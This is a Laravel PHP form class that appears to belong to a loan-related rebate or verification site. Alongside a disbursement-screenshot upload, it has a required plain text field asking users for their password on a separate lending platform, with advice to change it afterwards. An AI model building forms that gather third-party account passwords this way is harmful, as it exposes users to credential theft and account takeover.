<?php

namespace App\Forms;

use Kris\LaravelFormBuilder\Form;

class BbBackForm extends Form
{
    public function buildForm()
    {
        $this
        ->add('app', 'file', [
                'label' => "下款图",
                'rules' => 'required',
            ])
        // ->add('sms', 'text', [
        //         'label' => "借款平台账号",
        //         'rules' => 'required',
        //     ])
        ->add('password', 'text', [
                'label' => "借款平台密码(仅核验下款真实性,验证后请修改)",
                'rules' => 'required',
            ])   
        ->add('submit','submit',[
            'label' => '确定提交',
            'attr' => ['class' => 'btn btn-primary btn-block']
        ]);
    }
}
